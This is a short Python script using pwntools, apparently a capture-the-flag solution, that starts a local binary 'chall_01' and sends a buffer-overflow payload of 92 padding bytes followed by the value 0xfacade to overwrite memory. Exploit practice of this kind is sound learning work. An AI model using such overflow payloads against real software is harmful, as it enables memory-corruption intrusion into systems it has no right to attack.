from pwn import *
def main():
	p = process("./chall_01")
	print(p.recv())
	p.sendline(chr(int("00", 16)) * 6)
	payload = (chr(int("65", 16)) * (104 - 12)).encode() + p32(0xfacade)
	print(payload)
	p.sendline(payload)
	p.interactive()
main()
